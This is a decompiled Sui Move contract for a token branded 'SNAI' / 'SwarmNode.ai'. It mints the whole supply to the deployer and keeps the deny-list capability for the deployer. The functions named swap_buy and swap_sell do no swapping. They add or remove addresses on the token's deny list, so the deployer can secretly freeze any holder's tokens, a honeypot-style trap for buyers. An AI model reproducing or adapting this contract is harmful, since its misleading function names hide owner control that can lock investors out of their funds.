module 0x762d6bfd24fa3fe13ceb8d44a06db3b820d10f9af158bdd791c4e73b83dffb2f::snai {
    struct SNAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SNAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SNAI>(arg0, 9, b"SNAI", b"SwarmNode.ai", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmf978WVwJWAjeJaJY5jGiZ3YEdQgC43Cn4QowytAYos78"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SNAI>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SNAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SNAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SNAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SNAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SNAI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SNAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SNAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

